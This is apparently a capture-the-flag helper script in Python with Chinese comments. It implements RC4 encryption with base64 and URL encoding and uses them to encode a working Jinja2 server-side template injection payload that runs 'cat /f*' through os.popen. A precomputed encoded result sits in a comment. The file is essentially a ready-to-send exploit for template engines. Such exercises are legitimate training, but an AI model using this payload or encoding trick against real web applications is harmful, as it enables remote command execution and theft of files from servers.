import base64
from urllib.parse import quote
def rc4_main(key = "init_key", message = "init_message"):
    # print("RC4加密主函数")
    s_box = rc4_init_sbox(key)
    crypt = str(rc4_excrypt(message, s_box))
    return  crypt
def rc4_init_sbox(key):
    s_box = list(range(256))  # 我这里没管秘钥小于256的情况，小于256不断重复填充即可
    # print("原来的 s 盒：%s" % s_box)
    j = 0
    for i in range(256):
        j = (j + s_box[i] + ord(key[i % len(key)])) % 256
        s_box[i], s_box[j] = s_box[j], s_box[i]
    # print("混乱后的 s 盒：%s"% s_box)
    return s_box
def rc4_excrypt(plain, box):
    # print("调用加密程序成功。")
    res = []
    i = j = 0
    for s in plain:
        i = (i + 1) % 256
        j = (j + box[i]) % 256
        box[i], box[j] = box[j], box[i]
        t = (box[i] + box[j]) % 256
        k = box[t]
        res.append(chr(ord(s) ^ k))
    # print("res用于加密字符串，加密后是：%res" %res)
    cipher = "".join(res)
    print("加密后的字符串是：%s" %quote(cipher))
    #print("加密后的输出(经过编码):")
    #print(str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))
    return (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))
rc4_main("HereIsTreasure","{{ config.__class__.__init__.__globals__['os'].popen('cat /f*').read() }}")#第一个参数是密钥，第二个参数是需要加密的字符串
#加密后的字符串是：.%14%19V%C2%A5%09%0Dgl%C3%93%C3%A7%2C%C2%BD%C2%BE%C3%B7%C2%BB%27%C2%ACkz%C2%88m%C3%A9%7C%03%C2%85%07%C2%B6%1C%C3%B3%0D%C3%A0%21%C2%84O%C3%97%04%C3%A2%17%C3%9B%40%C2%9D%C2%82%C3%B1%2A3%C3%B3%0A%C2%AA%C2%ADCb%2A%C2%AC%29m%C2%83%7F%07%C3%82%C3%B3%0DX%C2%BB%C2%86%1C%C2%BBMr%0Dw%C3%B4R